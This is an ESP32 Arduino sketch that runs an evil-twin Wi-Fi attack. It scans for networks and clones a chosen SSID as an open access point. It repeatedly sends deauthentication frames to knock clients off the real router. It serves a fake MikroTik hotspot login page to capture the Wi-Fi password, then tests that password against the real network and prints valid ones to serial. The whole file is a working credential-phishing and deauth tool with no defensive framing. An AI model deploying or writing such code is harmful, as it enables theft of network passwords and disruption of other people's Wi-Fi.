#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

String targetSSID = "";
uint8_t targetBSSID[6] = {0,0,0,0,0,0};
int targetChannel = 1;
bool attackActive = false;
bool isValidated = false;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

void sendDeauth() {
  if (!attackActive || isValidated) return;
  uint8_t deauthPacket[26] = {0xc0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
  memcpy(&deauthPacket[10], targetBSSID, 6);
  memcpy(&deauthPacket[16], targetBSSID, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

String getMikrotikHTML(String errorMsg) {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
  html += "body{font-family:Arial;text-align:center;color:#777;background:#fff;}";
  html += ".box{border:1px solid #ccc;padding:40px 20px;margin:50px auto;max-width:350px;}";
  html += "table{margin:0 auto;text-align:left;}";
  html += "td{padding:5px;}";
  html += "input{border:1px solid #ffaa00;width:120px;padding:3px;}";
  html += "input[type=submit]{width:50px;background:#eee;border:1px solid #777;cursor:pointer;padding:2px;}";
  html += ".footer{font-size:12px;margin-top:20px;}</style></head><body>";
  html += "<p>Latviski</p><div class='box'><p>Please log on to use the internet hotspot service</p>";
  if(errorMsg != "") html += "<p style='color:red;font-size:12px;'>" + errorMsg + "</p>";
  html += "<form action='/check' method='POST'><table>";
  html += "<tr><td>login</td><td><input type='text' name='u' value='user' readonly></td></tr>";
  html += "<tr><td>password</td><td><input type='password' name='p' required autofocus></td></tr>";
  html += "<tr><td></td><td><input type='submit' value='OK'></td></tr></table></form><br>";
  html += "<b>HOTSPOT GATEWAY</b><br><span style='color:red;'>powered by </span><b><i>MikroTik</i></b></div>";
  html += "<p class='footer'>Powered by MikroTik RouterOS</p></body></html>";
  return html;
}

void handleRoot() {
  if (!attackActive) {
    String html = "<h2>WiFi Scanner</h2><p>Pilih target:</p>";
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; ++i) {
      html += "<p><a href='/select?id=" + String(i) + "'>" + WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dBm)</a></p>";
    }
    webServer.send(200, "text/html", html);
  } else {
    webServer.send(200, "text/html", getMikrotikHTML(""));
  }
}

void handleSelect() {
  int id = webServer.arg("id").toInt();
  targetSSID = WiFi.SSID(id);
  targetChannel = WiFi.channel(id);
  String macStr = WiFi.BSSIDstr(id);
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetBSSID[0], &targetBSSID[1], &targetBSSID[2], &targetBSSID[3], &targetBSSID[4], &targetBSSID[5]);
  WiFi.softAP(targetSSID.c_str(), NULL, targetChannel);
  attackActive = true;
  webServer.sendHeader("Location", "/", true);
  webServer.send(302, "text/plain", "");
}

void handleCheck() {
  String pass = webServer.arg("p");
  WiFi.begin(targetSSID.c_str(), pass.c_str());
  unsigned long t = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t < 8000) delay(500);
  if (WiFi.status() == WL_CONNECTED) {
    isValidated = true;
    Serial.println("\n[!] PASSWORD VALID: " + pass);
    webServer.send(200, "text/html", "<html><body><h2>Success</h2><p>Verified.</p></body></html>");
    WiFi.disconnect();
  } else {
    webServer.send(200, "text/html", getMikrotikHTML("Invalid username or password"));
    WiFi.mode(WIFI_AP);
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ESP32_CONSOLE", NULL, 1);
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.on("/select", handleSelect);
  webServer.on("/check", handleCheck);
  webServer.onNotFound([](){ webServer.sendHeader("Location", "/", true); webServer.send(302, "text/plain", ""); });
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  static unsigned long ld = 0;
  if (attackActive && !isValidated && millis() - ld > 1000) { sendDeauth(); ld = millis(); }
}
